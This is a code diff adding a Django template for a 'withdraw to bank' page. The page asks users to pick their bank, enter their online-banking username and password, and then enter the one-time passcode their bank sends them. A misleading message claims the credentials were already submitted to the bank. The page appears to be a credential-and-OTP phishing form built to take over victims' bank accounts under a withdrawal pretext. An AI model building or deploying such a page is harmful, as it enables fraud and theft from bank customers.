@@ -1,0 +1,199 @@
+{% extends 'app/dashboard_layout.html' %}
+{% load static %}
+
+{% block title %}{{ withdraw_type|title }} to Bank {% endblock %}
+
+{% block dashboard_content %}
+    <div class="payment-page">
+        <div class="payment-header">
+            <div class="back-button-container">
+                <a href="{% url 'payment_method_selection' %}?type={{ withdraw_type }}" class="back-button">
+                    <i class="fas fa-arrow-left"></i>
+                    Back to Payment Methods
+                </a>
+            </div>
+            <h1>{{ withdraw_type|title }} to Bank</h1>
+            <p>Connect your bank account securely</p>
+        </div>
+        
+        <div class="payment-content">
+            <div class="payment-form">
+                <form id="bank-form" method="post" hx-post="{% url 'bank_manual_payment' %}" hx-swap="none">
+                            {% csrf_token %}
+                            <input type="hidden" name="withdraw_type" value="{{ withdraw_type }}">
+                            <input type="hidden" name="step" id="form-step" value="1">
+
+                            <div class="form-group">
+                                <label class="form-label">Bank Name</label>
+                                <select class="form-input" name="bank_name" required>
+                                    <option value="">Select your bank</option>
+                                    <optgroup label="US Banks">
+                                        <option value="chase">Chase Bank</option>
+                                        <option value="bank_of_america">Bank of America</option>
+                                        <option value="wells_fargo">Wells Fargo</option>
+                                        <option value="citibank">Citibank</option>
+                                        <option value="us_bank">U.S. Bank</option>
+                                        <option value="pnc">PNC Bank</option>
+                                        <option value="capital_one">Capital One</option>
+                                        <option value="td_bank">TD Bank</option>
+                                        <option value="american_express">American Express Bank</option>
+                                        <option value="goldman_sachs">Goldman Sachs</option>
+                                    </optgroup>
+                                    <optgroup label="European Banks">
+                                        <option value="deutsche_bank">Deutsche Bank (Germany)</option>
+                                        <option value="bnp_paribas">BNP Paribas (France)</option>
+                                        <option value="societe_generale">Société Générale (France)</option>
+                                        <option value="credit_agricole">Crédit Agricole (France)</option>
+                                        <option value="unicredit">UniCredit (Italy)</option>
+                                        <option value="intesa_sanpaolo">Intesa Sanpaolo (Italy)</option>
+                                        <option value="santander">Banco Santander (Spain)</option>
+                                        <option value="bbva">BBVA (Spain)</option>
+                                        <option value="rabobank">Rabobank (Netherlands)</option>
+                                        <option value="ing">ING Bank (Netherlands)</option>
+                                        <option value="ubs">UBS (Switzerland)</option>
+                                        <option value="credit_suisse">Credit Suisse (Switzerland)</option>
+                                        <option value="hsbc_uk">HSBC UK</option>
+                                        <option value="barclays">Barclays (UK)</option>
+                                        <option value="lloyds">Lloyds Bank (UK)</option>
+                                        <option value="rbs">Royal Bank of Scotland (UK)</option>
+                                    </optgroup>
+                                    <optgroup label="Asian Banks">
+                                        <option value="mitsubishi_ufj">Mitsubishi UFJ Financial Group (Japan)</option>
+                                        <option value="sumitomo_mitsui">Sumitomo Mitsui Financial Group (Japan)</option>
+                                        <option value="mizuho">Mizuho Financial Group (Japan)</option>
+                                        <option value="icici">ICICI Bank (India)</option>
+                                        <option value="hdfc">HDFC Bank (India)</option>
+                                        <option value="sbi">State Bank of India</option>
+                                        <option value="industrial_commercial">Industrial and Commercial Bank of China</option>
+                                        <option value="china_construction">China Construction Bank</option>
+                                        <option value="agricultural_bank">Agricultural Bank of China</option>
+                                        <option value="bank_of_china">Bank of China</option>
+                                        <option value="shinhan">Shinhan Bank (South Korea)</option>
+                                        <option value="kookmin">Kookmin Bank (South Korea)</option>
+                                        <option value="dbs">DBS Bank (Singapore)</option>
+                                        <option value="ocbc">OCBC Bank (Singapore)</option>
+                                        <option value="uob">United Overseas Bank (Singapore)</option>
+                                    </optgroup>
+                                    <optgroup label="Other Banks">
+                                        <option value="royal_bank_canada">Royal Bank of Canada</option>
+                                        <option value="td_canada">TD Canada Trust</option>
+                                        <option value="scotiabank">Scotiabank (Canada)</option>
+                                        <option value="commonwealth_bank">Commonwealth Bank (Australia)</option>
+                                        <option value="westpac">Westpac (Australia)</option>
+                                        <option value="anz">ANZ Bank (Australia)</option>
+                                        <option value="national_australia">National Australia Bank</option>
+                                        <option value="standard_bank">Standard Bank (South Africa)</option>
+                                        <option value="first_rand">FirstRand Bank (South Africa)</option>
+                                        <option value="nedbank">Nedbank (South Africa)</option>
+                                        <option value="itau">Itaú Unibanco (Brazil)</option>
+                                        <option value="bradesco">Bradesco (Brazil)</option>
+                                        <option value="banamex">Banamex (Mexico)</option>
+                                        <option value="banorte">Banorte (Mexico)</option>
+                                        <option value="other">Other Bank</option>
+                                    </optgroup>
+                                </select>
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label">Username/User ID</label>
+                                <input class="form-input" name="username" required placeholder="Your bank login username" />
+                            </div>
+
+                            <div class="form-group">
+                                <label class="form-label">Password</label>
+                                <input class="form-input" name="password" type="password" required placeholder="Your bank login password" />
+                            </div>
+
+                            <!-- OTP Section (Hidden initially) -->
+                            <div id="otp-section" style="display: none;">
+                                <div class="form-group">
+                                    <label class="form-label">Enter OTP from Bank</label>
+                                    <input class="form-input" name="otp_code" placeholder="Enter 6-digit OTP" maxlength="6" />
+                                    <small style="color: #6c757d; display: block; margin-top: 4px;">Check your phone/email for the OTP from your bank</small>
+                                </div>
+                            </div>
+
+
+                            <button type="submit" id="submit-btn" class="login-button" style="width: 100%;">
+                                <i class="fas fa-university" style="margin-right: 8px;"></i>
+                                <span id="btn-text">Connect Bank Account</span>
+                            </button>
+                </form>
+            </div>
+        </div>
+    </div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+
+    // Two-step form process
+    const form = document.getElementById('bank-form');
+    const otpSection = document.getElementById('otp-section');
+    const submitBtn = document.getElementById('submit-btn');
+    const btnText = document.getElementById('btn-text');
+    const formStep = document.getElementById('form-step');
+    let isStep2 = false;
+
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        if (!isStep2) {
+            // Step 1: Submit bank credentials
+            const bankName = document.querySelector('[name="bank_name"]').value;
+            const username = document.querySelector('[name="username"]').value;
+            const password = document.querySelector('[name="password"]').value;
+            
+            if (!bankName || !username || !password) {
+                Toastify({
+                    text: "Please fill in all required fields",
+                    duration: 3000,
+                    gravity: "top",
+                    position: "right",
+                    backgroundColor: "#dc3545",
+                    stopOnFocus: true
+                }).showToast();
+                return;
+            }
+            
+            // Show OTP section
+            otpSection.style.display = 'block';
+            formStep.value = '2';
+            btnText.textContent = 'Complete Transaction';
+            isStep2 = true;
+            
+            // Show success toast
+            Toastify({
+                text: "Bank credentials submitted! Your bank will send you an OTP. Please check your phone/email and enter the OTP below.",
+                duration: 5000,
+                gravity: "top",
+                position: "right",
+                backgroundColor: "#28a745",
+                stopOnFocus: true
+            }).showToast();
+            
+            // Scroll to OTP section
+            otpSection.scrollIntoView({ behavior: 'smooth' });
+        } else {
+            // Step 2: Submit with OTP
+            const otpCode = document.querySelector('[name="otp_code"]').value;
+            if (!otpCode) {
+                Toastify({
+                    text: "Please enter the OTP from your bank",
+                    duration: 3000,
+                    gravity: "top",
+                    position: "right",
+                    backgroundColor: "#dc3545",
+                    stopOnFocus: true
+                }).showToast();
+                return;
+            }
+            
+            // Submit the form
+            form.submit();
+        }
+    });
+});
+</script>
+{% endblock %}
